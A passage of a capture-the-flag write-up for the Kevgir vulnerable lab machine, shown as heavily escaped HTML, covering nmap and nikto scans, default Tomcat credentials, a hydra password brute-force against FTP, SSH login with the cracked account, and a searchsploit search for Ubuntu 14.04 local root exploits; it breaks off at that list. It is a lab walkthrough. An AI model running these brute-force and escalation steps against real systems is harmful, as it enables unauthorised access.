+</span><span class='line'><span class="p">|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+</span><span class='line'><span class="p">|</span>&lt;em&gt;  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+</span><span class='line'><span class="p">|</span> smb-os-discovery:
+</span><span class='line'><span class="p">|</span>   OS: Unix <span class="o">(</span>Samba 4.1.6-Ubuntu<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>   Computer name: canyoupwnme
+</span><span class='line'><span class="p">|</span>   NetBIOS computer name: CANYOUPWNME
+</span><span class='line'><span class="p">|</span>   Domain name:
+</span><span class='line'><span class="p">|</span>   FQDN: canyoupwnme
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;  System <span class="nb">time</span>: 2016-05-23T13:22:22+03:00
+</span><span class='line'><span class="p">|</span> smb-security-mode:
+</span><span class='line'><span class="p">|</span>   account_used: guest
+</span><span class='line'><span class="p">|</span>   authentication_level: user
+</span><span class='line'><span class="p">|</span>   challenge_response: supported
+</span><span class='line'><span class="p">|</span>&lt;em&gt;  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;smbv2-enabled: Server supports SMBv2 protocol&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'><span class="m">1</span>   0.34 ms 10.1.1.128&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Read data files from: /usr/bin/../share/nmap
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/submit/&quot;</span>&gt;https://nmap.org/submit/&lt;/a&gt; .&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;Nmap <span class="k">done</span> at Mon May <span class="m">23</span> 06:22:54 <span class="m">2016</span> <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 153.46 seconds&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>There are some suspectable information:</p>
+
+<ul>
+<li>FTP service is running on port 25</li>
+<li>SSH service is running on port 1322</li>
+<li>Web service is running on port 80</li>
+<li>Redis services is running on port 6379</li>
+<li>Tomcat is running on port 8080</li>
+<li>Joomla v1.5 is running on port 8081</li>
+<li>Jenkins is running on port 9000</li>
+</ul>
+
+
+<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80, 8080, 9091 and 9000 found by port-scanning stage.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h2&gt;- Nikto v2.1.6&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;Target IP:          10.1.1.128&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Target Hostname:    10.1.1.128&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Target Port:        80
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;Start Time:         2016-05-23 06:28:48 <span class="o">(</span>GMT-4<span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;Server: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Server leaks inodes via ETags, header found with file /, fields: 0xec 0x52c8b6c4fbb0a&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;The anti-clickjacking X-Frame-Options header is not present.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Apache/2.4.7 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.14&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-ob_mode<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: 0&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;OSVDB-3233: /icons/README: Apache default file found.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;/phpmyadmin/: phpMyAdmin directory found&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;8479 requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">10</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;End Time:           2016-05-23 06:29:07 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span><span class="m">19</span> seconds<span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;1 host<span class="o">(</span>s<span class="o">)</span> tested
+</span></code></pre></td></tr></table></div></figure></li>
+</ul>
+
+
+<p>phpmyadmin was found but nothing else, so I move on to port 8080.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h2&gt;- Nikto v2.1.6&lt;/h2&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;Target IP:          10.1.1.128&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Target Hostname:    10.1.1.128&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Target Port:        8080
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;Start Time:         2016-05-23 06:30:28 <span class="o">(</span>GMT-4<span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;Server: Apache-Coyote/1.1&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;The anti-clickjacking X-Frame-Options header is not present.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;No CGI Directories found <span class="o">(</span>use <span class="p">&amp;</span>lsquo<span class="p">;</span>-C all<span class="p">&amp;</span>rsquo<span class="p">;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;OSVDB-397: HTTP method <span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>Allow<span class="p">&amp;</span>rsquo<span class="p">;</span> Header<span class="o">)</span>: <span class="p">&amp;</span>lsquo<span class="p">;</span>PUT<span class="p">&amp;</span>rsquo<span class="p">;</span> method could allow clients to save files on the web server.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;OSVDB-5646: HTTP method <span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>Allow<span class="p">&amp;</span>rsquo<span class="p">;</span> Header<span class="o">)</span>: <span class="p">&amp;</span>lsquo<span class="p">;</span>DELETE<span class="p">&amp;</span>rsquo<span class="p">;</span> may allow clients to remove files on the web server.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;/: Appears to be a default Apache Tomcat install.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;/examples/servlets/index.html: Apache Tomcat default JSP pages present.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;Default account found <span class="k">for</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>Tomcat Manager Application<span class="p">&amp;</span>rsquo<span class="p">;</span> at /manager/html <span class="o">(</span>ID <span class="p">&amp;</span>lsquo<span class="p">;</span>tomcat<span class="p">&amp;</span>rsquo<span class="p">;</span>, PW <span class="p">&amp;</span>lsquo<span class="p">;</span>tomcat<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>. Apache Tomcat.&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;/manager/html: Tomcat Manager / Host Manager interface found <span class="o">(</span>pass protected<span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;/host-manager/html: Tomcat Manager / Host Manager interface found <span class="o">(</span>pass protected<span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;/manager/status: Tomcat Server Status interface found <span class="o">(</span>pass protected<span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;li&gt;7643 requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">14</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;End Time:           2016-05-23 06:30:50 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span><span class="m">22</span> seconds<span class="o">)</span>&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;1 host<span class="o">(</span>s<span class="o">)</span> tested
+</span></code></pre></td></tr></table></div></figure></li>
+</ul>
+
+
+<p>Based on the result, default tomcat login/password was found: <font color="red"><code>tomcat/tomcat</code></font></p>
+
+<h3>Vector 1: FTP login bruteforce attack</h3>
+
+<p>Use <code>hydra</code> with <a href="https://github.com/danielmiessler/SecLists" title="SecLists">SecLists</a> dictionary to brute force week password:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt -u -s <span class="m">25</span> 10.1.1.128 ftp
+</span><span class='line'>Hydra v8.1 <span class="p">&amp;</span>copy<span class="p">;</span> <span class="m">2014</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> starting at 2016-05-23 06:52:29
+</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">34177</span> login tries <span class="o">(</span>l:11/p:3107<span class="o">)</span>, ~33 tries per task
+</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 25
+</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 320.00 tries/min, <span class="m">320</span> tries in 00:01h, <span class="m">33857</span> todo in 01:46h, <span class="m">16</span> active
+</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 320.33 tries/min, <span class="m">961</span> tries in 00:03h, <span class="m">33216</span> todo in 01:44h, <span class="m">16</span> active
+</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 314.14 tries/min, <span class="m">2199</span> tries in 00:07h, <span class="m">31978</span> todo in 01:42h, <span class="m">16</span> active
+</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 311.20 tries/min, <span class="m">4668</span> tries in 00:15h, <span class="m">29509</span> todo in 01:35h, <span class="m">16</span> active
+</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 310.39 tries/min, <span class="m">9622</span> tries in 00:31h, <span class="m">24555</span> todo in 01:20h, <span class="m">16</span> active
+</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 311.81 tries/min, <span class="m">14655</span> tries in 00:47h, <span class="m">19522</span> todo in 01:03h, <span class="m">16</span> active
+</span><span class='line'><span class="o">[</span>25<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.128   login: admin   password: admin
+</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> 313.14 tries/min, <span class="m">19728</span> tries in 01:03h, <span class="m">14449</span> todo in 00:47h, <span class="m">16</span> active
+</span><span class='line'>^CThe session file ./hydra.restore was written. Type <span class="p">&amp;</span>ldquo<span class="p">;</span>hydra -R<span class="p">&amp;</span>rdquo<span class="p">;</span> to resume session.
+</span><span class='line'>root@kali:~/Kevgir#
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>login/password found: <font color="red"><code>admin/admin</code></font></p>
+
+<p>Then using the found username/password login via SSH (port 1322), and &hellip; succeed!</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# ssh -p <span class="m">1322</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x61;&amp;#100;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#64;&amp;#x31;&amp;#x30;&amp;#46;&amp;#x31;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#x64;&amp;#109;&amp;#x69;&amp;#x6e;&amp;#64;&amp;#49;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#x32;&amp;#56;&lt;/a&gt;</span>
+</span><span class='line'>The authenticity of host <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>10.1.1.128<span class="o">]</span>:1322 <span class="o">([</span>10.1.1.128<span class="o">]</span>:1322<span class="o">)</span><span class="p">&amp;</span>rsquo<span class="p">;</span> can<span class="p">&amp;</span>rsquo<span class="p">;</span>t be established.
+</span><span class='line'>ECDSA key fingerprint is 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a.
+</span><span class='line'>Are you sure you want to <span class="k">continue</span> connecting <span class="o">(</span>yes/no<span class="o">)</span>? yes
+</span><span class='line'>Warning: Permanently added <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>10.1.1.128<span class="o">]</span>:1322<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  G:                ,<span class="p">;</span>                                          &lt;br/&gt;
+</span><span class='line'>  E#,    :        f#i                        .Gt  t    j.       &lt;br/&gt;
+</span><span class='line'>  E#t  .GE      .E#t                        j#W:  Ej   EW,      &lt;br/&gt;
+</span><span class='line'>  E#t j#K<span class="p">;</span>     i#W,     t      .DD.       <span class="p">;</span>K#f    E#,  E##j     &lt;br/&gt;
+</span><span class='line'>  E#GK#f      L#D.      EK:   ,WK.      .G#D.     E#t  E###D.   &lt;br/&gt;
+</span><span class='line'>  E##D.     :K#Wfff<span class="p">;</span>    E#t  i#D       j#K<span class="p">;</span>       E#t  E#jG#W<span class="p">;</span>  &lt;br/&gt;
+</span><span class='line'>  E##Wi     i##WLLLLt   E#t j#f      ,K#f   ,GD<span class="p">;</span>  E#t  E#t t##f &lt;br/&gt;
+</span><span class='line'>  E#jL#D:    .E#L       E#tL#i        j#Wi   E#t  E#t  E#t  :K#E:
+</span><span class='line'>  E#t ,K#j     f#E:     E#WW,          .G#D: E#t  E#t  E#KDDDD###i
+</span><span class='line'>  E#t   jD      ,WW<span class="p">;</span>    E#K:             ,K#fK#t  E#t  E#f,t#Wi,,,
+</span><span class='line'>  j#t            .D#<span class="p">;</span>   ED.                j###t  E#t  E#t  <span class="p">;</span><span class="c">#W:&lt;br/&gt;</span>
+</span><span class='line'>   ,<span class="p">;</span>              tt   t                   .G#t  E#t  DWi   ,KK:
+</span><span class='line'>                                              <span class="p">;;</span>  ,<span class="p">;</span>.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;                                               by canyoupwn.me
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#97;&amp;#100;&amp;#109;&amp;#105;&amp;#x6e;&amp;#x40;&amp;#49;&amp;#48;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#x64;&amp;#x6d;&amp;#105;&amp;#110;&amp;#64;&amp;#x31;&amp;#48;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
+</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>&gt;https://help.ubuntu.com/&lt;/a&gt;&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  System information as of Mon May <span class="m">23</span> 22:56:12 EEST 2016&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  System load: 0.32              Memory usage: 4%   Processes:       167
+</span><span class='line'>  Usage of /:  32.5% of 6.50GB   Swap usage:   0%   Users logged in: 0&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  Graph this data and manage this system at:
+</span><span class='line'>    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://landscape.canonical.com/&quot;</span>&gt;https://landscape.canonical.com/&lt;/a&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;151 packages can be updated.
+</span><span class='line'><span class="m">79</span> updates are security updates.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;The programs included with the Ubuntu system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span><span class='line'>applicable law.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;admin@canyoupwnme:~<span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>admin<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then, spending time on enumeration and found the target system is <code>Ubuntu 14.04</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>admin@canyoupwnme:/home/user<span class="nv">$ </span>uname -a
+</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Try to local priv escape and searching keyword <code>14.04</code> in exploit-db</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/usr/share/exploitdb# ./searchsploit 14.04&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt; Exploit Title                                                                                                                             <span class="p">|</span>  Path
+</span><span class='line'>                                                                                                                                           <span class="p">|</span> <span class="o">(</span>/usr/share/exploitdb/platforms<span class="o">)</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Apport 2.14.1 <span class="o">(</span>Ubuntu 14.04.2<span class="o">)</span> - Linux Local Root Exploit                                                                                  <span class="p">|</span> ./linux/local/36782.sh
+</span><span class='line'>Seagate Central 2014.0410.0026-F Remote Root Exploit                                                                                       <span class="p">|</span> ./hardware/remote/37184.py
+</span><span class='line'>Seagate Central 2014.0410.0026-F Remote Facebook Access Token Exploit                                                                      <span class="p">|</span> ./hardware/webapps/37185.py
+</span><span class='line'>Linux Kernel 3.13.0 <span class="p">&amp;</span>lt<span class="p">;</span> 3.19 <span class="o">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="o">)</span> - overlayfs Local Root Shell                                                   <span class="p">|</span> ./linux/local/37292.c
+</span><span class='line'>Linux Kernel 3.13.0 <span class="p">&amp;</span>lt<span class="p">;</span> 3.19 <span class="o">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="o">)</span> - overlayfs Privilege Escalation <span class="o">(</span>Access /etc/shadow<span class="o">)</span>                          <span class="p">|</span> ./linux/local/37293.txt
+</span><span class='line'>NetKit FTP Client <span class="o">(</span>Ubuntu 14.04<span class="o">)</span> - Crash/DoS PoC                                                                                           <span class="p">|</span> ./linux/dos/37777.txt
+</span><span class='line'>Linux Kernel <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span> 4.3.3 <span class="o">(</span>Ubuntu 14.04/15.10<span class="o">)</span> - overlayfs Local Root Exploit                                                                  <span class="p">|</span> ./linux/local/39166.c
